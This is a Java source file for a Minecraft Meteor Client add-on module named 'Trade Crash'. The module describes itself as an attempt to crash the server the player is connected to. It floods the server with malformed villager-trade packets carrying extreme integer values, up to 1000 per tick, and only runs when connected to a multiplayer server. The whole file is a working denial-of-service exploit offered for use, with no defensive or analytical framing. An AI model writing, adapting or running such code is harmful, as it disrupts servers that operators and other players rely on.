package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.SelectMerchantTradeC2SPacket;

public class TradeCrash extends Module {

    private final Setting<Integer> amount;

    private final Setting<Modes> mode;

    private final Setting<Boolean> autoDisable;
    public TradeCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Trade Crash", "CRYSTAL || Attempts to crash the server you are on by sending broken villager trading packets.");

        SettingGroup sgGeneral = settings.getDefaultGroup();

        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build());

        mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which type of packet to send.")
            .defaultValue(Modes.MIN)
            .build());

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if(!mc.isInSingleplayer()) {
            if (Utils.canUpdate()) {
                int i = 0;
                if (i >= amount.get()) {
                    return;
                }
                if (mc.player != null) {
                    if(mode.get() == Modes.MIN) {
                        mc.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(Integer.MIN_VALUE));
                    } else {
                        mc.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(Integer.MAX_VALUE));
                    }

                }
                i++;
                while (true) {
                    if (i < amount.get()) {
                        if (mc.player == null && mc.getNetworkHandler() != null) {
                            CrystalAddon.LOG.error("Player and getNetworkHandler are both null.");
                            error("Player and getNetworkHandler are both null, toggling.");
                            toggle();
                        } else {
                            if(mode.get() == Modes.MIN) {
                                mc.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(Integer.MIN_VALUE));
                            } else {
                                mc.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(Integer.MAX_VALUE));
                            }
                        }
                        i++;
                    } else {
                        break;
                    }
                }
            } else {
                return;
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    public enum Modes {
        MIN,
        MAX
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }
}
